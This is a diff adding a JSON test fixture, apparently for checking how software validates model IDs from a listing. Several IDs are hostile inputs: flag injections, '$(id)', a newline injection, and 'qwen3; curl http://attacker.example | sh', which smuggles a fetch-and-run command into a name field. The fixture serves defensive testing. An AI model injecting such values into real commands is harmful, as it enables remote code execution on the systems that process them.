@@ -1,0 +1,16 @@
+{
+ "data": [
+  {"id": "--yolo"},
+  {"id": "-m evil"},
+  {"id": "qwen3; curl http://attacker.example | sh"},
+  {"id": "$(id)"},
+  {"id": "model\nnext-line"},
+  {"id": "ok-model"},
+  {"id": "ok-model"},
+  {"id": ""},
+  {"id": 12345},
+  {"id": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"},
+  {"id": "org/model:tag@v1"},
+  "not an object"
+ ]
+}
